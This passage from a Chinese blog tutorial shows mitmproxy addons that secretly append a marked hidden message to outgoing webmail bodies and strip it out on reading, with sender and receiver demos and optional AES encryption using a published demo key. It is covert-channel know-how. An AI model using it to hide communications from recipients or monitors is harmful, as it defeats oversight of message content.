string">''</span><span class="token punctuation">,</span> html_content<span class="token punctuation">)</span><br>flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>content <span class="token operator">=</span> html_content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"gb18030"</span><span class="token punctuation">)</span><br>flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Content-Length"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><br></code></pre> <br><p>然后功能实现了</p> <br><p><img src="https://i-blog.csdnimg.cn/direct/308711a1afdb43548e07ece916e7cc62.png" alt="没有隐藏信息" /></p> <br><h4><a id="_574"></a>展示工作</h4> <br><p>所有所需功能已经实现，接下来就是演示了。</p> <br><p>发送端：一个小黑框，接收想要隐蔽传递的信息</p> <br><p>接收端：一个小黑框，显示接收到的隐藏信息</p> <br><pre><code>今日指令<br><br>今日跑步挑战：今天每人跑步10000米，保持健康，突破自我！<br>（记录时间：，完成情况：）<br><br>今日阅读任务：今天每人阅读50页书，提升知识储备，开阔视野。<br>（书名：，进度：）<br><br>今日饮水目标：今天每人饮水2000毫升，保持身体水分平衡。<br>（完成杯数：，剩余目标：）<br><br>今日学习时间：今天每人学习2小时，专注于技能提升或兴趣培养。<br>（学习内容：，完成情况：）<br><br>今日冥想练习：今天每人冥想15分钟，放松身心，提升专注力。<br>（冥想主题：，感受：）<br><br>今日写作任务：今天每人写作500字，记录生活或创作故事。<br>（写作主题：，完成字数：）<br><br>今日蔬果摄入：今天每人摄入5份蔬果，保持均衡饮食。<br>（蔬果种类：，完成份数：）<br><br>今日早睡目标：今天每人晚上10点前入睡，保证充足睡眠。<br>（实际入睡时间：，睡眠质量：）<br><br>今日感恩记录：今天每人记录3件值得感恩的事，培养积极心态。<br>（感恩事项：1.____ 2.____ 3.____）<br><br>今日运动打卡：今天每人完成30分钟运动，形式不限（跑步、瑜伽、健身等）。<br>（运动类型：，完成时长：）<br></code></pre> <br><h4><a id="_616"></a>最终代码</h4> <br><p>改包：</p> <br><pre><code class="prism language-python"><span class="token keyword">from</span> mitmproxy <span class="token keyword">import</span> http<br><span class="token keyword">from</span> urllib<span class="token punctuation">.</span>parse <span class="token keyword">import</span> parse_qs<span class="token punctuation">,</span> urlencode<br><span class="token keyword">import</span> logging<br><span class="token keyword">import</span> re<br><br>logger <span class="token operator">=</span> logging<span class="token punctuation">.</span>getLogger<span class="token punctuation">(</span><span class="token string">'logger_url'</span><span class="token punctuation">)</span><br>formatter_url <span class="token operator">=</span> logging<span class="token punctuation">.</span>Formatter<span class="token punctuation">(</span><span class="token string">'%(asctime)s - %(name)s - %(levelname)s - %(message)s'</span><span class="token punctuation">)</span><br><span class="token keyword">for</span> handler <span class="token keyword">in</span> logger<span class="token punctuation">.</span>handlers<span class="token punctuation">[</span><span class="token punctuation">:</span><span class="token punctuation">]</span><span class="token punctuation">:</span><br>    <span class="token keyword">if</span> <span class="token builtin">isinstance</span><span class="token punctuation">(</span>handler<span class="token punctuation">,</span> logging<span class="token punctuation">.</span>StreamHandler<span class="token punctuation">)</span><span class="token punctuation">:</span><br>        logger<span class="token punctuation">.</span>removeHandler<span class="token punctuation">(</span>handler<span class="token punctuation">)</span><br>logger<span class="token punctuation">.</span>setLevel<span class="token punctuation">(</span>logging<span class="token punctuation">.</span>DEBUG<span class="token punctuation">)</span><br>filehandler_url <span class="token operator">=</span> logging<span class="token punctuation">.</span>FileHandler<span class="token punctuation">(</span><span class="token string">'url.log'</span><span class="token punctuation">)</span><br>filehandler_url<span class="token punctuation">.</span>setFormatter<span class="token punctuation">(</span>formatter_url<span class="token punctuation">)</span><br>logger<span class="token punctuation">.</span>addHandler<span class="token punctuation">(</span>filehandler_url<span class="token punctuation">)</span><br>logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'url log init'</span><span class="token punctuation">)</span><br><br><br><span class="token comment"># logger_text = logging.getLogger('logger_text')</span><br><span class="token comment"># formatter_text = logging.Formatter('%(asctime)s - %(name)s - %(levelname)s - %(message)s')</span><br><span class="token comment"># for handler in logger_text.handlers[:]:</span><br><span class="token comment">#     if isinstance(handler, logging.StreamHandler):</span><br><span class="token comment">#         logger_text.removeHandler(handler)</span><br><span class="token comment"># logger_text.setLevel(logging.DEBUG)</span><br><span class="token comment"># filehandler_text = logging.FileHandler('text.log')</span><br><span class="token comment"># filehandler_text.setFormatter(formatter_text)</span><br><span class="token comment"># logger_text.addHandler(filehandler_text)</span><br><br><br><span class="token comment"># def request(flow: http.HTTPFlow) -> None:</span><br><span class="token comment">#     # 修改请求</span><br><span class="token comment">#     # if "letmefly.xyz" in flow.request.pretty_url:</span><br><span class="token comment">#     if "web.letmefly.xyz" in flow.request.pretty_url and 'text/html' in flow.response.headers.get('content-type', ''):</span><br><span class="token comment">#         # flow.request.headers["User-Agent"] = "Modified-Agent"</span><br><span class="token comment">#         flow.request.text  # 暂时未知</span><br><span class="token comment">#     pass</span><br><br><span class="token comment"># def response(flow: http.HTTPFlow) -> None:</span><br><span class="token comment">#     # 修改响应</span><br><span class="token comment">#     logger.info(flow.request.pretty_url)</span><br><span class="token comment">#     if "web.letmefly.xyz" in flow.request.pretty_url and 'text/html' in flow.response.headers.get('content-type', ''):</span><br><span class="token comment">#     # if flow.request.pretty_url == 'https://web.letmefly.xyz/':</span><br><span class="token comment">#         logger.info('replace HTML to LMTH')</span><br><span class="token comment">#         # logger_text.info(flow.response.text)</span><br><span class="token comment">#         flow.response.text = flow.response.text.replace("HTML", "LMTH")</span><br><br><span class="token comment"># https://chat.deepseek.com/a/chat/s/354e2ce6-8c46-41f3-b32b-944407aaf2f1</span><br><span class="token keyword">class</span> <span class="token class-name">AddSignatureAddon</span><span class="token punctuation">:</span><br>    <span class="token keyword">def</span> <span class="token function">request</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> flow<span class="token punctuation">:</span> http<span class="token punctuation">.</span>HTTPFlow<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span><br>        <span class="token keyword">if</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"POST"</span> <span class="token keyword">and</span> <span class="token string">"/cgi-bin/compose_send"</span> <span class="token keyword">in</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url<span class="token punctuation">:</span><br>            content_type <span class="token operator">=</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><br>            <span class="token keyword">if</span> <span class="token string">"application/x-www-form-urlencoded"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> content_type<span class="token punctuation">:</span><br>                <span class="token keyword">return</span><br>            <span class="token comment"># 解析原始表单数据</span><br>            <span class="token keyword">try</span><span class="token punctuation">:</span><br>                parsed_data <span class="token operator">=</span> parse_qs<span class="token punctuation">(</span>flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br>            <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><br>                logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"解析表单数据失败: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><br>                <span class="token keyword">return</span><br><br>            <span class="token comment"># 修改content__html字段</span><br>            <span class="token keyword">if</span> <span class="token string">"content__html"</span> <span class="token keyword">in</span> parsed_data <span class="token keyword">and</span> parsed_data<span class="token punctuation">[</span><span class="token string">"content__html"</span><span class="token punctuation">]</span><span class="token punctuation">:</span><br>                original_content <span class="token operator">=</span> parsed_data<span class="token punctuation">[</span><span class="token string">"content__html"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><br>                <span class="token keyword">try</span><span class="token punctuation">:</span><br>                    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'letsender'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span><br>                        hiddenMsg <span class="token operator">=</span> f<span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><br>                <span class="token keyword">except</span><span class="token punctuation">:</span><br>                    hiddenMsg <span class="token operator">=</span> <span class="token string">'计划有变'</span><br>                new_content <span class="token operator">=</span> original_content <span class="token operator">+</span> <span class="token string-interpolation"><span class="token string">f"*******</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>hiddenMsg<span class="token punctuation">}</span></span><span class="token string">*******"</span></span><br>                parsed_data<span class="token punctuation">[</span><span class="token string">"content__html"</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> new_content<br><br>                <span class="token comment"># 重新编码并更新请求内容</span><br>                updated_content <span class="token operator">=</span> urlencode<span class="token punctuation">(</span>parsed_data<span class="token punctuation">,</span> doseq<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"utf-8"</span><span class="token punctuation">)</span><br>                flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>content <span class="token operator">=</span> updated_content<br>                logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"成功添加签名！"</span><span class="token punctuation">)</span><br>            <span class="token keyword">else</span><span class="token punctuation">:</span><br>                logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">"未找到content__html字段"</span><span class="token punctuation">)</span><br>    <br>    <span class="token keyword">def</span> <span class="token function">response</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> flow<span class="token punctuation">:</span> http<span class="token punctuation">.</span>HTTPFlow<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token boolean">None</span><span class="token punctuation">:</span><br>        <span class="token keyword">if</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">'GET'</span> <span class="token keyword">and</span> <span class="token string">'/cgi-bin/readmail'</span> <span class="token keyword">in</span> flow<span class="token punctuation">.</span>request<span class="token punctuation">.</span>url<span class="token punctuation">:</span><br>            <span class="token keyword">if</span> <span class="token string">"text/html"</span> <span class="token keyword">not</span> <span class="token keyword">in</span> flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"Content-Type"</span><span class="token punctuation">,</span> <span class="token string">""</span><span class="token punctuation">)</span><span class="token punctuation">:</span><br>                <span class="token keyword">return</span><br>            <span class="token keyword">try</span><span class="token punctuation">:</span><br>                html_content <span class="token operator">=</span> flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>content<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token string">"gb18030"</span><span class="token punctuation">)</span><br>            <span class="token keyword">except</span> UnicodeDecodeError<span class="token punctuation">:</span><br>                logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string">'解码失败：可能不是GB18030编码'</span><span class="token punctuation">)</span><br>            <span class="token comment"># soup = BeautifulSoup(html_content, "lxml")</span><br>            <span class="token comment"># content_div = soup.find("div", {"id": "mailContentContainer"})</span><br>            <span class="token comment"># logger.info(f'{content_div}')</span><br>            <span class="token comment"># if not content_div:</span><br>            <span class="token comment">#     return</span><br>            <span class="token comment"># text_nodes = content_div.find_all(text=True, recursive=True)</span><br>            <span class="token comment"># for node in text_nodes:</span><br>            <span class="token comment">#     # 匹配签名模式（支持动态内容）</span><br>            <span class="token comment">#     match = re.search(r'\*{7}(.*?)\*{7}', node.string)</span><br>            <span class="token comment">#     if match:</span><br>            <span class="token comment">#         signature = match.group(1)</span><br>            <span class="token comment">#         print(f"提取到签名：{signature}")</span><br>            <span class="token comment">#         clean_text = re.sub(r'\*{7}.*?\*{7}', '', node.string)</span><br>            <span class="token comment">#         node.replace_with(clean_text)</span><br>            <span class="token comment"># # 不知道为啥，BS解析后直接把头部的编码给改了</span><br>            <span class="token comment"># meta_tag = soup.find("meta", attrs={"http-equiv": "Content-Type"})</span><br>            <span class="token comment"># if meta_tag:</span><br>            <span class="token comment">#     meta_tag["content"] = "text/html; charset=gb18030"</span><br>            <span class="token keyword">match</span> <span class="token operator">=</span> re<span class="token punctuation">.</span>search<span class="token punctuation">(</span><span class="token string">r'\*{7}(.*?)\*{7}'</span><span class="token punctuation">,</span> html_content<span class="token punctuation">)</span><br>            <span class="token keyword">if</span> <span class="token keyword">match</span><span class="token punctuation">:</span><br>                signature <span class="token operator">=</span> <span class="token keyword">match</span><span class="token punctuation">.</span>group<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><br>                logger<span class="token punctuation">.</span>info<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"提取到签名：</span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>signature<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><br>                <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'letreceiver'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span><br>                    f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>signature<span class="token punctuation">)</span><br>                html_content <span class="token operator">=</span> re<span class="token punctuation">.</span>sub<span class="token punctuation">(</span><span class="token string">r'\*{7}.*?\*{7}'</span><span class="token punctuation">,</span> <span class="token string">''</span><span class="token punctuation">,</span> html_content<span class="token punctuation">)</span><br>            flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>content <span class="token operator">=</span> html_content<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">"gb18030"</span><span class="token punctuation">)</span><br>            flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>headers<span class="token punctuation">[</span><span class="token string">"Content-Length"</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span><span class="token builtin">len</span><span class="token punctuation">(</span>flow<span class="token punctuation">.</span>response<span class="token punctuation">.</span>content<span class="token punctuation">)</span><span class="token punctuation">)</span><br><br>addons <span class="token operator">=</span> <span class="token punctuation">[</span>AddSignatureAddon<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">]</span><br></code></pre> <br><p>发送方demo：</p> <br><pre><code class="prism language-python"><span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><br>    data <span class="token operator">=</span> <span class="token builtin">input</span><span class="token punctuation">(</span><span class="token string">'想隐蔽传输的信息：'</span><span class="token punctuation">)</span><br>    <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'letsender'</span><span class="token punctuation">,</span> <span class="token string">'w'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> f<span class="token punctuation">:</span><br>        f<span class="token punctuation">.</span>write<span class="token punctuation">(</span>data<span class="token punctuation">)</span><br></code></pre> <br><p>接收方demo：</p> <br><pre><code class="prism language-python"><span class="token keyword">import</span> time<br><span class="token keyword">from</span> watchdog<span class="token punctuation">.</span>observers <span class="token keyword">import</span> Observer<br><span class="token keyword">from</span> watchdog<span class="token punctuation">.</span>events <span class="token keyword">import</span> FileSystemEventHandler<br><span class="token keyword">import</span> os<br><br>FILE_PATH <span class="token operator">=</span> <span class="token string">'letreceiver'</span><br><br><span class="token keyword">if</span> <span class="token keyword">not</span> os<span class="token punctuation">.</span>path<span class="token punctuation">.</span>exists<span class="token punctuation">(</span>FILE_PATH<span class="token punctuation">)</span><span class="token punctuation">:</span><br>    os<span class="token punctuation">.</span>system<span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f'echo > </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>FILE_PATH<span class="token punctuation">}</span></span><span class="token string">'</span></span><span class="token punctuation">)</span><br><br><span class="token keyword">class</span> <span class="token class-name">FileChangeHandler</span><span class="token punctuation">(</span>FileSystemEventHandler<span class="token punctuation">)</span><span class="token punctuation">:</span><br>    <span class="token keyword">def</span> <span class="token function">on_modified</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> event<span class="token punctuation">)</span><span class="token punctuation">:</span><br>        <span class="token keyword">if</span> event<span class="token punctuation">.</span>src_path<span class="token punctuation">.</span>endswith<span class="token punctuation">(</span>FILE_PATH<span class="token punctuation">)</span><span class="token punctuation">:</span><br>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"File </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>FILE_PATH<span class="token punctuation">}</span></span><span class="token string"> has been modified. Reading new content..."</span></span><span class="token punctuation">)</span><br>            self<span class="token punctuation">.</span>read_file_content<span class="token punctuation">(</span><span class="token punctuation">)</span><br><br>    <span class="token keyword">def</span> <span class="token function">read_file_content</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span><br>        <span class="token keyword">try</span><span class="token punctuation">:</span><br>            <span class="token keyword">with</span> <span class="token builtin">open</span><span class="token punctuation">(</span>FILE_PATH<span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">,</span> encoding<span class="token operator">=</span><span class="token string">'utf-8'</span><span class="token punctuation">)</span> <span class="token keyword">as</span> <span class="token builtin">file</span><span class="token punctuation">:</span><br>                content <span class="token operator">=</span> <span class="token builtin">file</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><br>                <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"New content:"</span><span class="token punctuation">)</span><br>                <span class="token keyword">print</span><span class="token punctuation">(</span>content<span class="token punctuation">)</span><br>        <span class="token keyword">except</span> Exception <span class="token keyword">as</span> e<span class="token punctuation">:</span><br>            <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Error reading file: </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>e<span class="token punctuation">}</span></span><span class="token string">"</span></span><span class="token punctuation">)</span><br><br><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span><br>    <span class="token comment"># 创建事件处理器和观察者</span><br>    event_handler <span class="token operator">=</span> FileChangeHandler<span class="token punctuation">(</span><span class="token punctuation">)</span><br>    observer <span class="token operator">=</span> Observer<span class="token punctuation">(</span><span class="token punctuation">)</span><br>    observer<span class="token punctuation">.</span>schedule<span class="token punctuation">(</span>event_handler<span class="token punctuation">,</span> path<span class="token operator">=</span><span class="token string">'.'</span><span class="token punctuation">,</span> recursive<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">)</span><br><br>    <span class="token comment"># 启动观察者</span><br>    observer<span class="token punctuation">.</span>start<span class="token punctuation">(</span><span class="token punctuation">)</span><br>    <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string-interpolation"><span class="token string">f"Started watching </span><span class="token interpolation"><span class="token punctuation">{<!-- --></span>FILE_PATH<span class="token punctuation">}</span></span><span class="token string"> for changes..."</span></span><span class="token punctuation">)</span><br><br>    <span class="token keyword">try</span><span class="token punctuation">:</span><br>        <span class="token keyword">while</span> <span class="token boolean">True</span><span class="token punctuation">:</span><br>            time<span class="token punctuation">.</span>sleep<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><br>    <span class="token keyword">except</span> KeyboardInterrupt<span class="token punctuation">:</span><br>        observer<span class="token punctuation">.</span>stop<span class="token punctuation">(</span><span class="token punctuation">)</span><br><br>    observer<span class="token punctuation">.</span>join<span class="token punctuation">(</span><span class="token punctuation">)</span><br></code></pre> <br><h4><a id="_793"></a>提升</h4> <br><p>当然也可以通过AES加密</p> <br><p>首先随机生成个AES密钥：</p> <br><pre><code class="prism language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Random <span class="token keyword">import</span> get_random_bytes<br><br><span class="token comment"># 生成256位（32字节）AES密钥</span><br>key <span class="token operator">=</span> get_random_bytes<span class="token punctuation">(</span><span class="token number">32</span><span class="token punctuation">)</span><br><span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"AES Key:"</span><span class="token punctuation">,</span> key<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br></code></pre> <br><p>这里我们约定密钥为：<code>e3a9a39b3c95c109257aeb8c09cb8ad331779647c54de1a40a66d308f8e4a882</code>。</p> <br><p>当然，在实际执行的时候，密钥可不能公布出来。</p> <br><p>然后开始使用密钥加密解密：</p> <br><pre><code class="prism language-python"><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Cipher <span class="token keyword">import</span> AES<br><span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>Util<span class="token punctuation">.</span>Padding <span class="token keyword">import</span> pad<span class="token punctuation">,</span> unpad<br><br><br><span class="token keyword">def</span> <span class="token function">encrypt_aes</span><span class="token punctuation">(</span>plaintext<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> key<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bytes</span><span class="token punctuation">:</span><br>    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">)</span>  <span class="token comment"># 使用CBC模式</span><br>    ct_bytes <span class="token operator">=</span> cipher<span class="token punctuation">.</span>encrypt<span class="token punctuation">(</span>pad<span class="token punctuation">(</span>plaintext<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><span class="token punctuation">)</span><br>    <span class="token keyword">return</span> cipher<span class="token punctuation">.</span>iv <span class="token operator">+</span> ct_bytes  <span class="token comment"># 返回IV + 密文</span><br><br><br><span class="token keyword">def</span> <span class="token function">decrypt_aes</span><span class="token punctuation">(</span>ciphertext<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">,</span> key<span class="token punctuation">:</span> <span class="token builtin">bytes</span><span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">str</span><span class="token punctuation">:</span><br>    iv <span class="token operator">=</span> ciphertext<span class="token punctuation">[</span><span class="token punctuation">:</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">]</span><br>    ct <span class="token operator">=</span> ciphertext<span class="token punctuation">[</span>AES<span class="token punctuation">.</span>block_size<span class="token punctuation">:</span><span class="token punctuation">]</span>  <span class="token comment"># 密文</span><br>    cipher <span class="token operator">=</span> AES<span class="token punctuation">.</span>new<span class="token punctuation">(</span>key<span class="token punctuation">,</span> AES<span class="token punctuation">.</span>MODE_CBC<span class="token punctuation">,</span> iv<span class="token punctuation">)</span><br>    pt <span class="token operator">=</span> unpad<span class="token punctuation">(</span>cipher<span class="token punctuation">.</span>decrypt<span class="token punctuation">(</span>ct<span class="token punctuation">)</span><span class="token punctuation">,</span> AES<span class="token punctuation">.</span>block_size<span class="token punctuation">)</span><br>    <span class="token keyword">return</span> pt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><br><br>msg <span class="token operator">=</span> <span class="token string">'其实今天要进攻'</span><br>key <span class="token operator">=</span> <span class="token builtin">bytes</span><span class="token punctuation">.</span>fromhex<span class="token punctuation">(</span><span class="token string">'e3a9a39b3c95c109257aeb8c09cb8ad331779647c54de1a40a66d308f8e4a882'</span><span class="token punctuation">)</span>  <span class="token comment"># 演示用，实际可别公布</span><br>encrypted <span class="token operator">=</span> encrypt_aes<span class="token punctuation">(</span>msg<span class="token punctuation">,</span> key<span class="token punctuation">)</span><br><span class="token keyword">print</span><span class="token punctuation">(</span>encrypted<span class="token punctuation">.</span><span class="token builtin">hex</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><br>decrypt <span class="token operator">=</span> decrypt_aes<span class="token punctuation">(</span>encrypted<span class="token punctuation">,</span> key<span class="token punctuation">)</span><br><span class="token keyword">print</span><span class="token punctuation">(</span>decrypt<span class="token punctuation">)</span><br></code></pre> <br><p>运行结果：</p> <br><pre><code>PS F:\OtherApps\Program\Git\Store\Store20_LeetCode\tryGoPy\MGJW\thisWeek> python main.py<br>a41c71290d5ebc864b0feef9537a407d8b55504148bc0755b079cd4d1005cc7b80e9a98ec1df78a858a9ca8020208fc4<br>其实今天要进攻<br>PS F:\OtherApps\Program\Git\Store\Store20_LeetCode\tryGoPy\MGJW\thisWeek> python main.py<br>668c2d139c5729d432f403fa9bfad77fdb9c38cc0ae2f8dd66deff7141b656a46b36a3d2d82b8da07ee2a1e9c1179ee7<br>其实今天要进攻<br>PS F:\OtherApps\Program\Git\Store\Store20_LeetCode\tryGoPy\MGJW\thisWeek> python main.py<br>0a6b612c98f3d602f6185adf560d5467f3f4ca1505d6f913552a4d9de459f95cdeb25c3195410e50d3ffd40297e164e0<br>其实今天要进攻<br>PS F:\OtherApps\Program\Git\Store\Store20_LeetCode\tryGoPy\MGJW\thisWeek> python main.py<br>75e3cd8c45bd2223021b90deeec8352ca9bdd4f9bf816f03064099139541fa37b33a2b79e7d3a749c51ef7d4ec2a1dc1<br>其实今天要进攻<br>PS F:\OtherApps\Program\Git\Store\Store20_LeetCode\tryGoPy\MGJW\thisWeek> python main.py<br>a5d65efb6037ca9ff21d0aef20a03d1289cc6feb0f1616ebe49c4458c686a6a7da405fdeab7a2a706190783d3f9b7bd9<br>其实今天要进攻<br></code></pre> <br><p>不难发现，每次加密出来的结果都不一样，这就避免了“统计每个字符频率”等破解方法。</p> <br><p>之后就是收发双方以此为依据进行数据加密与解密了。</p> <br><h3><a id="End_863"></a>End</h3> <br><blockquote> <br> <p>同步发文于<a href="https://letmefly.blog.csdn.net/article/details/146461437" rel="nofollow">CSDN</a>和我的<a href="https://blog.letmefly.xyz/" rel="nofollow">个人博客</a>，原创不易，转载经作者同意后请附上<a href="https://blog.letmefly.xyz/2025/03/23/Other-Network-HowToSendHiddenMsgThroughEmailWithMitmproxy/" rel="nofollow">原文链接</a>哦~</p> <br> <p>千篇源码题解<a href="https://github.com/LetMeFly666/LeetCode">已开源</a></p> <br></blockquote>